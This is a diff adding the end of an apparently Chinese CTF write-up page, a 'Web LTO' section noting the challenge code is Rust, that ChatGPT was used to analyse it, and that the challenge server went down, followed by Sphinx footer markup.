+<h3>Web LTO<a class="headerlink" href="#web-lto" title="Permalink to this heading"></a></h3>
+<p>.rs 后缀，是 Rust 语言编写的代码，简单交给 ChatGPT 分析一下：</p>
+<p><img alt="image-20230505111658168" src="../../../_images/image-20230505111658168.png" /></p>
+<blockquote>
+<div><p>题目环境今天 down 掉了，比较难受吧，暂时先复现 D3。</p>
+</div></blockquote>
+</section>
+</section>
+</section>
+
+
+           </div>
+          </div>
+          <footer>
+
+  <hr/>
+
+  <div role="contentinfo">
+    <p>&#169; Copyright 2023, MirRoR4s.</p>
+  </div>
+
+  Built with <a href="https://www.sphinx-doc.org/">Sphinx</a> using a
+    <a href="https://github.com/readthedocs/sphinx_rtd_theme">theme</a>
+    provided by <a href="https://readthedocs.org">Read the Docs</a>.
+   
+
+</footer>
+        </div>
+      </div>
+    </section>
+  </div>
+  <script>
+      jQuery(function () {
+          SphinxRtdTheme.Navigation.enable(true);
+      });
+  </script> 
+
+</body>
+</html>
